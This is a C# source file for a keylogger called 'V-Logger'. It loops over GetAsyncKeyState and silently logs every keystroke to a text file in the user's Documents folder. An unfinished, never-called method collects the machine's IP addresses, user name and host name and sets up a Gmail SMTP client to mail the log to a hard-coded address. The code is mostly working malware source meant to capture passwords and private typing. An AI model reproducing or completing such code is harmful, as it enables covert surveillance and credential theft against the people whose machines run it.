using System;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;

namespace V_Logger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        //string to hold all of the keystrokes.
        static string keyLog = "";

        static void Main(string[] args)
        {
            //Plan
            //capture keystrokes and display them to the console.

            //reaching folder Documents
            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            //setting the filder and filename.
            string path = (filePath + @"\strokes.txt");

            //check if the directory not exists, if not then create it.
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }

            //if the file not exists in the directory then create a new text file.
            if(!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) { };
            }

            while (true)
            {
                //pause and let other programs a chace to run.
                Thread.Sleep(5);

                //chack all keys fr their state.
                //using ascii here  (asciitable.com)  32 is space button, etc, etc...
                for (int i = 32; i <= 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    //if (keyState !=0)
                    //{
                    //    Console.Write(keyState + " | ");
                    //}

                    //store the log in textfile.
                    if (keyState == 32769)
                    {
                        Console.Write((char) i + ", ");

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        };
                    }

                }  


            }

        }

        //send the txt file content periodically via email.
        static void sendMessage() 
        {
            //send the content of a text file to a mail address.
            string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            string path = (filePath + @"\strokes.txt");

            string logContent = File.ReadAllText(filePath);


            //create an E-mail message.
            DateTime Now = DateTime.Now;

            string mailBody = "";
            string subject = "Message from V-Logger.";

            var Host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in Host.AddressList)
            {
                mailBody += "Address:" + address;
            }
            mailBody += "\n User: " + Environment.UserDomainName + " // " + Environment.UserName;
            mailBody += "\n Host" + Host;
            mailBody += "\n Time: " + Now.ToString();

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("v-Logger@gmail.com");
            mailMessage.To.Add("vorago01@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;

        }
    }
}
